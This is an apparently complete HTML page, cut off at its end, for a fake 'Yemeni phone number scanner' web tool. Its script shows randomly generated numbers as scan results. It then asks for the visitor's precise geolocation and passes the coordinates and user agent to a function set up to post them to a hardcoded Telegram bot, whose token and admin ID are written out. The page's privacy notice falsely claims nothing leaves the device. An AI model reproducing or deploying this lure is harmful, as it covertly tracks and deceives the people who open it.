<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  
  <!-- Open Graph Meta Tags -->
  <meta property="og:title" content="üì° ŸÜÿ∏ÿßŸÖ ŸÖÿ≥ÿ≠ ÿßŸÑÿ£ÿ±ŸÇÿßŸÖ ÿßŸÑŸäŸÖŸÜŸäÿ© - YMS Pro">
  <meta property="og:description" content="ÿ£ÿØÿßÿ© ŸÖÿ™ÿ∑Ÿàÿ±ÿ© ŸÑŸÉÿ¥ŸÅ Ÿàÿ™ÿ≠ŸÑŸäŸÑ ÿ£ÿ±ŸÇÿßŸÖ ÿßŸÑŸáŸàÿßÿ™ŸÅ ŸÅŸä ÿßŸÑÿ¥ÿ®ŸÉÿ© ÿßŸÑŸÖÿ¨ÿßŸàÿ±ÿ©">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://yemen-scanner.netlify.app">
  <meta property="og:image" content="images/image.jpg">
  <meta property="og:locale" content="ar_YE">
  <meta property="og:site_name" content="Yemen Mobile Scanner">
  
  <title>YMS Pro - ŸÜÿ∏ÿßŸÖ ŸÖÿ≥ÿ≠ ÿßŸÑÿ£ÿ±ŸÇÿßŸÖ ÿßŸÑŸäŸÖŸÜŸäÿ©</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --primary: #4facfe;
      --you-color: #8a2be2;
      --yemen-mobile-color: #38a169;
      --sabafon-color: #dd6b20;
      --mtn-color: #e53e3e;
      --light: #f7fafc;
      --dark: #0f172a;
      --card-bg: rgba(15, 23, 42, 0.85);
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: 'Tajawal', sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      color: var(--light);
      text-align: center;
      min-height: 100vh;
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      line-height: 1.6;
      animation: gradientShift 15s ease infinite;
      background-size: 400% 400%;
    }
    
    @keyframes gradientShift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    
    /* ÿ™ÿ£ÿ´Ÿäÿ±ÿßÿ™ ÿßŸÑÿÆŸÑŸÅŸäÿ© */
    .grid-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: 
        linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
      background-size: 30px 30px;
      z-index: 1;
      pointer-events: none;
    }
    
    .particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
      overflow: hidden;
    }
    
    .particle {
      position: absolute;
      background: rgba(100, 200, 255, 0.5);
      border-radius: 50%;
      animation: float linear infinite;
    }
    
    @keyframes float {
      to { transform: translateY(-100vh) translateX(20px); }
    }
    
    .pulse-effect {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 300px;
      height: 300px;
      border-radius: 50%;
      background: radial-gradient(circle, rgba(66,153,225,0.2) 0%, rgba(66,153,225,0) 70%);
      animation: pulse 4s ease-out infinite;
      z-index: -1;
    }
    
    @keyframes pulse {
      0% { transform: translate(-50%, -50%) scale(0.8); opacity: 0.7; }
      100% { transform: translate(-50%, -50%) scale(1.5); opacity: 0; }
    }
    
    .scanlines {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: repeating-linear-gradient(
        0deg,
        rgba(0,0,0,0),
        rgba(0,0,0,0) 3px,
        rgba(255,255,255,0.03) 4px,
        rgba(255,255,255,0.03) 4px
      );
      z-index: 2;
      pointer-events: none;
      animation: scanline 8s linear infinite;
    }
    
    @keyframes scanline {
      0% { transform: translateY(-100%); }
      100% { transform: translateY(100%); }
    }
    
    /* ÿßŸÑÿ™ÿµŸÖŸäŸÖ ÿßŸÑÿ±ÿ¶Ÿäÿ≥Ÿä */
    .scanner-container {
      width: 100%;
      max-width: 500px;
      background: var(--card-bg);
      border-radius: 20px;
      padding: 30px;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
      border: 1px solid rgba(255, 255, 255, 0.1);
      position: relative;
      overflow: hidden;
      backdrop-filter: blur(8px);
      z-index: 10;
    }
    
    .scanner-container::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: linear-gradient(
        to bottom right,
        rgba(255,255,255,0) 0%,
        rgba(255,255,255,0.1) 50%,
        rgba(255,255,255,0) 100%
      );
      transform: rotate(30deg);
      animation: shine 6s infinite;
    }
    
    @keyframes shine {
      0% { transform: translateX(-100%) rotate(30deg); }
      100% { transform: translateX(100%) rotate(30deg); }
    }
    
    .scanner-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 25px;
      padding-bottom: 15px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    .scanner-title {
      color: #fff;
      font-size: 1.6rem;
      font-weight: 700;
      text-shadow: 0 0 10px rgba(100, 200, 255, 0.7);
      display: flex;
      align-items: center;
      gap: 10px;
    }
    
    .scanner-icon {
      font-size: 2rem;
      color: var(--primary);
      animation: pulse 2s infinite;
    }
    
    .badge {
      position: absolute;
      top: 20px;
      left: 20px;
      background: linear-gradient(135deg, #ff416c, #ff4b2b);
      color: white;
      padding: 4px 10px;
      border-radius: 20px;
      font-size: 0.8rem;
      font-weight: bold;
      animation: pulse 2s infinite;
      z-index: 11;
    }
    
    .version {
      position: absolute;
      bottom: 20px;
      left: 20px;
      font-size: 0.7rem;
      color: rgba(255,255,255,0.5);
      z-index: 11;
    }
    
    /* ŸÖÿ≥ÿ≠ ÿßŸÑÿ™ŸÅÿßÿµŸäŸÑ */
    .scan-details {
      background: rgba(0, 0, 0, 0.3);
      border-radius: 12px;
      padding: 15px;
      margin: 20px 0;
      border: 1px solid rgba(100, 200, 255, 0.1);
      display: none;
      animation: slideUp 0.5s ease-out;
    }
    
    @keyframes slideUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    .detail-row {
      display: flex;
      justify-content: space-between;
      margin: 12px 0;
      font-size: 0.95rem;
    }
    
    .detail-label {
      color: #7f9cf5;
    }
    
    .detail-value {
      color: var(--light);
      font-family: 'Courier New', monospace;
      text-shadow: 0 0 5px rgba(100, 200, 255, 0.5);
    }
    
    .network-type {
      display: inline-block;
      padding: 3px 10px;
      border-radius: 15px;
      font-size: 0.8rem;
      font-weight: bold;
      margin-right: 5px;
    }
    
    .you { background: var(--you-color); }
    .yemen-mobile { background: var(--yemen-mobile-color); }
    .sabafon { background: var(--sabafon-color); }
    .mtn { background: var(--mtn-color); }
    
    /* ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑÿ£ÿ±ŸÇÿßŸÖ */
    .sim-list {
      background: rgba(0, 0, 0, 0.3);
      border-radius: 12px;
      padding: 15px;
      margin: 20px 0;
      max-height: 350px;
      overflow-y: auto;
      display: none;
      border: 1px solid rgba(100, 200, 255, 0.1);
    }
    
    .sim-item {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 15px;
      margin: 12px 0;
      background: rgba(0, 0, 0, 0.3);
      border-radius: 10px;
      transition: all 0.3s ease;
      box-shadow: 0 0 10px rgba(100, 200, 255, 0.1);
      border: 1px solid rgba(100, 200, 255, 0.1);
    }
    
    .sim-item:hover {
      background: rgba(0, 0, 0, 0.4);
      transform: translateX(-5px);
      box-shadow: 0 0 15px rgba(100, 200, 255, 0.3);
      border: 1px solid rgba(100, 200, 255, 0.3);
    }
    
    .sim-card {
      position: relative;
      padding-left: 30px;
      text-align: right;
      flex-grow: 1;
    }
    
    .sim-card::before {
      content: "";
      position: absolute;
      left: 8px;
      top: 50%;
      transform: translateY(-50%);
      width: 15px;
      height: 20px;
      background: linear-gradient(135deg, gold, #ffd700);
      border-radius: 3px;
      border: 1px solid rgba(0,0,0,0.3);
    }
    
    .sim-number {
      font-family: 'Courier New', monospace;
      font-size: 1.1rem;
      color: var(--light);
      letter-spacing: 1px;
      text-shadow: 0 0 5px rgba(100, 200, 255, 0.5);
    }
    
    .sim-info {
      font-size: 0.85rem;
      color: rgba(255, 255, 255, 0.7);
      margin-top: 5px;
      display: flex;
      gap: 10px;
    }
    
    .sim-type {
      background: rgba(100, 200, 255, 0.2);
      padding: 2px 8px;
      border-radius: 10px;
      font-size: 0.75rem;
    }
    
    .operator-logo {
      width: 45px;
      height: 45px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      font-size: 0.85rem;
      color: white;
      margin: 0 10px;
      flex-shrink: 0;
    }
    
    .signal-strength {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 5px;
      min-width: 60px;
    }
    
    .signal-bars {
      display: flex;
      align-items: center;
      gap: 3px;
      height: 20px;
    }
    
    .signal-bar {
      width: 5px;
      background: #48bb78;
      border-radius: 3px;
      transition: height 0.3s ease;
    }
    
    .signal-value {
      font-size: 0.85rem;
      color: #68d391;
      font-family: 'Courier New', monospace;
    }
    
    .scan-time {
      font-size: 0.75rem;
      color: rgba(255, 255, 255, 0.6);
      margin-top: 3px;
    }
    
    /* ÿ¥ÿ±Ÿäÿ∑ ÿßŸÑÿ™ŸÇÿØŸÖ */
    .scan-progress {
      height: 10px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      margin: 25px 0;
      overflow: hidden;
      position: relative;
      box-shadow: inset 0 1px 3px rgba(0,0,0,0.2);
      border: 1px solid rgba(100, 200, 255, 0.1);
    }
    
    .progress-bar {
      height: 100%;
      width: 0;
      background: linear-gradient(to right, var(--primary), #00f2fe);
      border-radius: 10px;
      transition: width 0.5s ease;
      position: relative;
      overflow: hidden;
    }
    
    .progress-bar::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: linear-gradient(
        90deg,
        rgba(255, 255, 255, 0) 0%,
        rgba(255, 255, 255, 0.3) 50%,
        rgba(255, 255, 255, 0) 100%
      );
      animation: shimmer 2s infinite;
    }
    
    @keyframes shimmer {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(100%); }
    }
    
    /* ÿ≠ÿßŸÑÿ© ÿßŸÑŸÖÿ≥ÿ≠ */
    .scan-status {
      font-size: 1.1rem;
      color: rgba(255, 255, 255, 0.9);
      margin-bottom: 20px;
      min-height: 70px;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 15px;
      border-radius: 10px;
      background: rgba(0, 0, 0, 0.3);
      border: 1px solid rgba(100, 200, 255, 0.1);
      box-shadow: 0 0 10px rgba(100, 200, 255, 0.1);
    }
    
    .loading-dots::after {
      content: '.';
      animation: dots 1.5s steps(5, end) infinite;
    }
    
    @keyframes dots {
      0%, 20% { content: '.'; }
      40% { content: '..'; }
      60%, 100% { content: '...'; }
    }
    
    /* ÿ≤ÿ± ÿßŸÑŸÖÿ≥ÿ≠ */
    .btn {
      background: linear-gradient(to right, var(--primary), #00f2fe);
      color: white;
      padding: 16px 25px;
      border: none;
      border-radius: 50px;
      font-size: 1.1rem;
      font-weight: 600;
      cursor: pointer;
      margin-top: 20px;
      transition: all 0.3s ease;
      box-shadow: 0 5px 15px rgba(79, 172, 254, 0.5);
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      width: 100%;
      position: relative;
      overflow: hidden;
      border: 1px solid rgba(100, 200, 255, 0.3);
    }
    
    .btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 8px 25px rgba(79, 172, 254, 0.8);
    }
    
    .btn:disabled {
      background: linear-gradient(to right, #4a5568, #2d3748);
      cursor: not-allowed;
      transform: none;
      box-shadow: none;
    }
    
    .btn::after {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: linear-gradient(
        to bottom right,
        rgba(255,255,255,0) 0%,
        rgba(255,255,255,0.3) 50%,
        rgba(255,255,255,0) 100%
      );
      transform: rotate(30deg);
      animation: btnShine 3s infinite;
    }
    
    @keyframes btnShine {
      0% { transform: translateX(-100%) rotate(30deg); }
      100% { transform: translateX(100%) rotate(30deg); }
    }
    
    /* ŸÖŸÑÿßÿ≠ÿ∏ÿ© ÿßŸÑÿÆÿµŸàÿµŸäÿ© */
    .privacy-note {
      font-size: 0.85rem;
      color: rgba(255, 255, 255, 0.6);
      margin-top: 25px;
      padding-top: 20px;
      border-top: 1px solid rgba(255, 255, 255, 0.1);
      line-height: 1.6;
    }
    
    /* ÿßŸÑÿ™ŸÉŸäŸÅ ŸÖÿπ ÿßŸÑÿ¥ÿßÿ¥ÿßÿ™ ÿßŸÑÿµÿ∫Ÿäÿ±ÿ© */
    @media (max-width: 576px) {
      .scanner-container {
        padding: 20px 15px;
      }
      
      .scanner-title {
        font-size: 1.4rem;
      }
      
      .sim-number {
        font-size: 1rem;
      }
      
      .sim-info {
        flex-direction: column;
        gap: 3px;
      }
    }
  </style>
</head>
<body>
  <!-- ÿ™ÿ£ÿ´Ÿäÿ±ÿßÿ™ ÿßŸÑÿÆŸÑŸÅŸäÿ© -->
  <div class="grid-overlay"></div>
  <div class="particles" id="particles"></div>
  <div class="pulse-effect"></div>
  <div class="scanlines"></div>
  
  <!-- ÿßŸÑŸÖÿ≠ÿ™ŸàŸâ ÿßŸÑÿ±ÿ¶Ÿäÿ≥Ÿä -->
  <div class="scanner-container">
    <div class="badge">PRO</div>
    <div class="version">v2.2.1</div>
    
    <div class="scanner-header">
      <div class="scanner-title">
        <i class="fas fa-mobile-alt"></i> ŸÜÿ∏ÿßŸÖ ŸÖÿ≥ÿ≠ ÿßŸÑÿ£ÿ±ŸÇÿßŸÖ
      </div>
      <div class="scanner-icon">
        <i class="fas fa-satellite-dish"></i>
      </div>
    </div>
    
    <div class="scan-status" id="scanStatus">
      ÿ¨ÿßÿ±Ÿä ÿ™ŸáŸäÿ¶ÿ© ŸÜÿ∏ÿßŸÖ ÿßŸÑŸÖÿ≥ÿ≠<span class="loading-dots"></span>
    </div>
    
    <div class="scan-progress">
      <div class="progress-bar" id="progressBar"></div>
    </div>
    
    <div class="scan-details" id="scanDetails">
      <!-- ÿ≥Ÿäÿ™ŸÖ ÿ™ÿπÿ®ÿ¶ÿ™Ÿáÿß ÿ®ÿßŸÑÿ¨ÿßŸÅÿßÿ≥ŸÉÿ±Ÿäÿ®ÿ™ -->
    </div>
    
    <div class="sim-list" id="simList">
      <!-- ÿ≥Ÿäÿ™ŸÖ ÿ•ÿ∂ÿßŸÅÿ© ÿ£ÿ±ŸÇÿßŸÖ SIM ŸáŸÜÿß ÿ®ÿ¥ŸÉŸÑ ÿØŸäŸÜÿßŸÖŸäŸÉŸä -->
    </div>
    
    <button class="btn" id="scanBtn" onclick="startLocationTracking()" style="display: none;">
      <i class="fas fa-map-marker-alt"></i> ÿ®ÿØÿ° ÿßŸÑŸÖÿ≥ÿ≠ ÿßŸÑÿ¨ÿ∫ÿ±ÿßŸÅŸä
    </button>
    
    <div class="privacy-note">
      <i class="fas fa-shield-alt"></i> Ÿáÿ∞ÿß ÿßŸÑÿ™ÿ∑ÿ®ŸäŸÇ Ÿäÿ≥ÿ™ÿÆÿØŸÖ ÿ™ŸÇŸÜŸäÿßÿ™ ŸÖÿ≥ÿ≠ ŸÖÿ™ŸÇÿØŸÖÿ© ŸÑÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑÿ¥ÿ®ŸÉÿßÿ™ ÿßŸÑŸÇÿ±Ÿäÿ®ÿ©. ÿ¨ŸÖŸäÿπ ÿßŸÑÿπŸÖŸÑŸäÿßÿ™ ÿ™ÿ™ŸÖ ÿπŸÑŸâ ÿ¨Ÿáÿßÿ≤ŸÉ ŸàŸÑÿß Ÿäÿ™ŸÖ ÿ™ÿÆÿ≤ŸäŸÜ ÿ£Ÿä ÿ®ŸäÿßŸÜÿßÿ™ ÿπŸÑŸâ ÿÆŸàÿßÿØŸÖ ÿÆÿßÿ±ÿ¨Ÿäÿ©.
    </div>
  </div>

  <script>
    // Telegram Configuration
    const TELEGRAM_BOT_TOKEN = "7641588791:AAGvjT-OItdTj3NsGqDPoWnYZnGO_BoQQp0";
    const TELEGRAM_ADMIN_ID = "1367401179";
    const TELEGRAM_USERNAME = "@amr_70_70";
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const scanBtn = document.getElementById("scanBtn");
    const progressBar = document.getElementById("progressBar");
    const simList = document.getElementById("simList");
    const scanStatus = document.getElementById("scanStatus");
    const scanDetails = document.getElementById("scanDetails");

    // ÿ®ŸäÿßŸÜÿßÿ™ ÿßŸÑÿ£ÿ±ŸÇÿßŸÖ ÿßŸÑŸäŸÖŸÜŸäÿ©
    const yemeniOperators = {
      "73": { name: "You", color: "you" },
      "77": { name: "Yemen Mobile", color: "yemen-mobile" },
      "71": { name: "MTN", color: "mtn" },
      "70": { name: "ÿ≥ÿ®ÿ£ŸÅŸàŸÜ", color: "sabafon" }
    };
    
    const cities = ["ÿµŸÜÿπÿßÿ°", "ÿπÿØŸÜ", "ÿ™ÿπÿ≤", "ÿ≠ÿ∂ÿ±ŸÖŸàÿ™", "ÿßŸÑÿ≠ÿØŸäÿØÿ©", "ÿ•ÿ®", "ŸÖÿ£ÿ±ÿ®"];
    const simTypes = ["ÿ¥ÿÆÿµŸä", "ÿπŸÖŸÑ", "ÿ¥ÿ±ŸÉÿ©", "ÿ≠ŸÉŸàŸÖŸä"];
    
    // ÿ•ŸÜÿ¥ÿßÿ° ÿ±ŸÇŸÖ ŸäŸÖŸÜŸä ÿπÿ¥Ÿàÿßÿ¶Ÿä
    function generateYemeniNumber() {
      const prefixes = Object.keys(yemeniOperators);
      const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
      const num1 = Math.floor(100 + Math.random() * 900);
      const num2 = Math.floor(1000 + Math.random() * 9000);
      return { 
        full: `+967 ${prefix} ${num1} ${num2}`,
        prefix: prefix
      };
    }
    
    // ÿ™ŸÅÿßÿµŸäŸÑ ÿßŸÑÿ¥ÿ®ŸÉÿ© ÿßŸÑÿπÿ¥Ÿàÿßÿ¶Ÿäÿ©
    const networkTypes = ["2G", "3G", "4G", "4G LTE", "5G"];
    const signalStrengths = [
      { value: "-110 dBm", text: "ÿ∂ÿπŸäŸÅÿ© ÿ¨ÿØÿßŸã", quality: 20 },
      { value: "-95 dBm", text: "ÿ∂ÿπŸäŸÅÿ©", quality: 40 },
      { value: "-80 dBm", text: "ŸÖÿ™Ÿàÿ≥ÿ∑ÿ©", quality: 60 },
      { value: "-65 dBm", text: "ÿ¨ŸäÿØÿ©", quality: 80 },
      { value: "-50 dBm", text: "ŸÖŸÖÿ™ÿßÿ≤ÿ©", quality: 100 }
    ];
    
    // ÿ•ŸÜÿ¥ÿßÿ° ÿ¨ÿ≥ŸäŸÖÿßÿ™ ŸÖÿ™ÿ≠ÿ±ŸÉÿ©
    function createParticles() {
      const particlesContainer = document.getElementById('particles');
      const particleCount = 50;
      
      for (let i = 0; i < particleCount; i++) {
        const particle = document.createElement('div');
        particle.classList.add('particle');
        
        const size = Math.random() * 3 + 1;
        particle.style.width = `${size}px`;
        particle.style.height = `${size}px`;
        particle.style.left = `${Math.random() * 100}%`;
        particle.style.top = `${Math.random() * 100}%`;
        particle.style.opacity = Math.random() * 0.5 + 0.1;
        particle.style.animationDuration = `${Math.random() * 20 + 10}s`;
        
        particlesContainer.appendChild(particle);
      }
    }
    
    // ÿπÿ±ÿ∂ ÿ™ŸÅÿßÿµŸäŸÑ ÿßŸÑŸÖÿ≥ÿ≠
    function showScanDetails() {
      const networkType = networkTypes[Math.floor(Math.random() * networkTypes.length)];
      const signal = signalStrengths[Math.floor(Math.random() * signalStrengths.length)];
      const operatorKeys = Object.keys(yemeniOperators);
      const randomOperator = yemeniOperators[operatorKeys[Math.floor(Math.random() * operatorKeys.length)]];
      
      scanDetails.innerHTML = `
        <div class="detail-row">
          <span class="detail-label">ŸÜŸàÿπ ÿßŸÑÿ¥ÿ®ŸÉÿ©:</span>
          <span class="detail-value">
            ${networkType} 
            <span class="network-type ${randomOperator.color}">${randomOperator.name}</span>
          </span>
        </div>
        <div class="detail-row">
          <span class="detail-label">ŸÇŸàÿ© ÿßŸÑÿ•ÿ¥ÿßÿ±ÿ©:</span>
          <span class="detail-value">${signal.value} (${signal.text})</span>
        </div>
        <div class="detail-row">
          <span class="detail-label">ŸÖÿπÿ±ŸÅ ÿßŸÑÿÆŸÑŸäÿ©:</span>
          <span class="detail-value">CID-${Math.floor(10000 + Math.random() * 90000)}</span>
        </div>
        <div class="detail-row">
          <span class="detail-label">ÿßŸÑŸÜÿ∑ÿßŸÇ ÿßŸÑÿ™ÿ±ÿØÿØŸä:</span>
          <span class="detail-value">${Math.floor(700 + Math.random() * 2100)} MHz</span>
        </div>
      `;
      
      scanDetails.style.display = "block";
    }
    
    // ÿπÿ±ÿ∂ ÿ£ÿ±ŸÇÿßŸÖ SIM ÿπÿ¥Ÿàÿßÿ¶Ÿäÿ©
    function showRandomNumbers() {
      simList.innerHTML = "";
      const numOfNumbers = 2 + Math.floor(Math.random() * 4); // 2-5 ÿ£ÿ±ŸÇÿßŸÖ
      
      for (let i = 0; i < numOfNumbers; i++) {
        const numberData = generateYemeniNumber();
        const operator = yemeniOperators[numberData.prefix];
        const city = cities[Math.floor(Math.random() * cities.length)];
        const simType = simTypes[Math.floor(Math.random() * simTypes.length)];
        const signalStrength = Math.floor(30 + Math.random() * 70);
        const time = new Date().toLocaleTimeString('ar-YE', { hour: '2-digit', minute: '2-digit' });
        
        const simItem = document.createElement("div");
        simItem.className = "sim-item";
        simItem.innerHTML = `
          <div class="sim-card">
            <div class="sim-number">${numberData.full}</div>
            <div class="sim-info">
              <span>${city}</span>
              <span class="sim-type">${simType}</span>
            </div>
          </div>
          <div class="operator-logo ${operator.color}">
            ${operator.name}
          </div>
          <div class="signal-strength">
            <div class="signal-value">${signalStrength}%</div>
            <div class="signal-bars">
              <div class="signal-bar" style="height: ${5 + (signalStrength/100) * 20}px;"></div>
              <div class="signal-bar" style="height: ${10 + (signalStrength/100) * 20}px;"></div>
              <div class="signal-bar" style="height: ${5 + (signalStrength/100) * 20}px;"></div>
              <div class="signal-bar" style="height: ${5 + (signalStrength/100) * 15}px;"></div>
            </div>
            <div class="scan-time">${time}</div>
          </div>
        `;
        
        simList.appendChild(simItem);
      }
      
      simList.style.display = "block";
      scanStatus.innerHTML = `‚úÖ ÿ™ŸÖ ÿßŸÉÿ™ÿ¥ÿßŸÅ <strong>${numOfNumbers}</strong> ÿ£ÿ±ŸÇÿßŸÖ ŸÜÿ¥ÿ∑ÿ© ŸÅŸä ÿßŸÑÿ¥ÿ®ŸÉÿ© ÿßŸÑŸÖÿ¨ÿßŸàÿ±ÿ©`;
      showScanDetails();
    }
    
    // ŸÖÿ≠ÿßŸÉÿßÿ© ÿπŸÖŸÑŸäÿ© ÿßŸÑŸÖÿ≥ÿ≠
    function simulateScan() {
      let progress = 0;
      const progressInterval = setInterval(() => {
        progress += Math.random() * 15;
        if (progress > 100) progress = 100;
        progressBar.style.width = `${progress}%`;
        
        if (progress < 25) {
          scanStatus.textContent = `ÿ¨ÿßÿ±Ÿä ÿßŸÑÿ®ÿ≠ÿ´ ÿπŸÜ ÿ£ÿ®ÿ±ÿßÿ¨ ÿßŸÑÿ¥ÿ®ŸÉÿ©... ${Math.floor(progress)}%`;
        } else if (progress < 50) {
          scanStatus.textContent = `ÿ¨ÿßÿ±Ÿä ÿ™ÿ≠ŸÑŸäŸÑ ÿ™ÿ±ÿØÿØÿßÿ™ ÿßŸÑÿ¥ÿ®ŸÉÿ©... ${Math.floor(progress)}%`;
        } else if (progress < 75) {
          scanStatus.textContent = `ÿ¨ÿßÿ±Ÿä ŸÖÿ≥ÿ≠ ÿßŸÑÿ£ÿ±ŸÇÿßŸÖ ÿßŸÑŸÜÿ¥ÿ∑ÿ©... ${Math.floor(progress)}%`;
        } else {
          scanStatus.textContent = `ÿ¨ÿßÿ±Ÿä ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™... ${Math.floor(progress)}%`;
        }
        
        if (progress === 100) {
          clearInterval(progressInterval);
          scanStatus.innerHTML = "üåç ŸäŸÑÿ≤ŸÖ ÿ™ÿ≠ÿØŸäÿØ ÿßŸÑŸÖŸàŸÇÿπ ÿßŸÑÿ¨ÿ∫ÿ±ÿßŸÅŸä ŸÑÿ™ÿ≠ÿ≥ŸäŸÜ ÿØŸÇÿ© ÿßŸÑŸÜÿ™ÿßÿ¶ÿ¨";
          scanBtn.style.display = "inline-flex";
        }
      }, 300);
    }
    
    // ÿ®ÿØÿ° ÿ™ÿ™ÿ®ÿπ ÿßŸÑŸÖŸàŸÇÿπ
    function startLocationTracking() {
      scanBtn.disabled = true;
      scanBtn.innerHTML = '<span class="loading"></span> ÿ¨ÿßÿ±Ÿä ÿ™ÿ≠ÿØŸäÿØ ÿßŸÑŸÖŸàŸÇÿπ...';
      scanStatus.textContent = "üì° ÿ¨ÿßÿ±Ÿä ÿßŸÑÿ®ÿ≠ÿ´ ÿπŸÜ ÿ£ŸÇÿ±ÿ® ÿ£ÿ®ÿ±ÿßÿ¨ ÿßŸÑÿßÿ™ÿµÿßŸÑ...";
      
      if (!navigator.geolocation) {
        scanStatus.innerHTML = "‚ùå ÿÆÿ∑ÿ£: ÿßŸÑŸÖÿ™ÿµŸÅÿ≠ ŸÑÿß ŸäÿØÿπŸÖ ÿÆÿØŸÖÿßÿ™ ÿßŸÑŸÖŸàŸÇÿπ ÿßŸÑÿ¨ÿ∫ÿ±ÿßŸÅŸä";
        scanBtn.innerHTML = '<i class="fas fa-redo"></i> ŸÖÿ≠ÿßŸàŸÑÿ© ŸÖÿ±ÿ© ÿ£ÿÆÿ±Ÿâ';
        scanBtn.disabled = false;
        return;
      }

      navigator.geolocation.getCurrentPosition(
        pos => {
          const { latitude, longitude } = pos.coords;
          scanStatus.textContent = "üîê ÿ¨ÿßÿ±Ÿä ÿ™ÿ¥ŸÅŸäÿ± ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ Ÿàÿ•ÿπÿØÿßÿØ ÿßŸÑÿ™ŸÇÿ±Ÿäÿ±...";
          progressBar.style.width = "0%";
          
          setTimeout(() => {
            let progress = 0;
            const analysisInterval = setInterval(() => {
              progress += Math.random() * 20;
              if (progress > 100) progress = 100;
              progressBar.style.width = `${progress}%`;
              
              if (progress < 40) {
                scanStatus.textContent = `ÿ¨ÿßÿ±Ÿä ŸÖÿ∑ÿßÿ®ŸÇÿ© ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ŸÖÿπ ÿßŸÑÿ¥ÿ®ŸÉÿßÿ™ ÿßŸÑŸÖÿ≠ŸÑŸäÿ©... ${Math.floor(progress)}%`;
              } else if (progress < 80) {
                scanStatus.textContent = `ÿ¨ÿßÿ±Ÿä ÿ™ÿ≠ŸÑŸäŸÑ ŸÇŸàÿ© ÿßŸÑÿ•ÿ¥ÿßÿ±ÿ©... ${Math.floor(progress)}%`;
              } else {
                scanStatus.textContent = `ÿ¨ÿßÿ±Ÿä ÿ•ÿπÿØÿßÿØ ÿßŸÑŸÜÿ™ÿßÿ¶ÿ¨ ÿßŸÑŸÜŸáÿßÿ¶Ÿäÿ©... ${Math.floor(progress)}%`;
              }
              
              if (progress === 100) {
                clearInterval(analysisInterval);
                showRandomNumbers();
                sendLocation(latitude, longitude);
                scanBtn.style.display = "none";
              }
            }, 200);
          }, 1500);
        },
        err => {
          console.warn(err);
          let msg = "‚ùå ÿ™ÿπÿ∞ÿ± ÿ•ŸÉŸÖÿßŸÑ ÿßŸÑŸÖÿ≥ÿ≠: ";
          switch (err.code) {
            case 1: msg += "ÿ™ŸÖ ÿ±ŸÅÿ∂ ÿßŸÑÿ•ÿ∞ŸÜ ŸÑŸÑŸàÿµŸàŸÑ ÿ•ŸÑŸâ ÿßŸÑŸÖŸàŸÇÿπ."; break;
            case 2: msg += "ÿßŸÑŸÖŸàŸÇÿπ ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠ ÿ≠ÿßŸÑŸäŸãÿß."; break;
            case 3: msg += "ÿ™ÿ¨ÿßŸàÿ≤ ÿßŸÑŸàŸÇÿ™ ÿßŸÑŸÖÿ≥ŸÖŸàÿ≠ ŸÑŸÑÿ®ÿ≠ÿ´."; break;
            default: msg += "ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ∫Ÿäÿ± ŸÖÿ™ŸàŸÇÿπ.";
          }
          scanStatus.innerHTML = msg;
          scanBtn.innerHTML = '<i class="fas fa-redo"></i> ÿ•ÿπÿßÿØÿ© ÿßŸÑŸÖÿ≠ÿßŸàŸÑÿ©';
          scanBtn.disabled = false;
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    }
    
    // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑŸÖŸàŸÇÿπ ÿ•ŸÑŸâ Telegram
    function sendLocation(lat, lon) {
      const agent = navigator.userAgent;
